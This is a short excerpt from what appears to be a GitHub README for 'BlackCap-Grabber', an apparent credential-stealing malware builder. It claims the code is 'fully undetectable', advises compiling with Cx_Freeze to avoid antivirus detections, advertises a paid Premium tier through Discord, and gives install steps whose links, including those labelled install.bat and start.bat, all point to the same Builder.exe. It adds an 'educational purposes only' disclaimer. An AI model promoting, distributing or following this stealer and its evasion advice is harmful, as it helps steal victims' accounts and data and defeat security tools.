...
##### BlackCap's Code is fully undetectable, the only detections are the fault of pyinstaller we recommend to use Cx_Freeze to compile it.


##### [:gem: Premium](https://discord.gg/5DMDqgds)
...
**NOTE:** 
- BlackCap was made only for educational purposes, all consequences caused by your actions are **your** responsibility and accountability.
...
2. Install [BlackCap Files](https://github.com/princeftw/BlackCap-Grabber/raw/main/Builder.exe)
3. Install all requirements [install.bat](https://github.com/princeftw/BlackCap-Grabber/raw/main/Builder.exe)
4. Click on start.bat [start.bat](https://github.com/princeftw/BlackCap-Grabber/raw/main/Builder.exe)
...
### Authors
prince [https://github.com/princeftw]
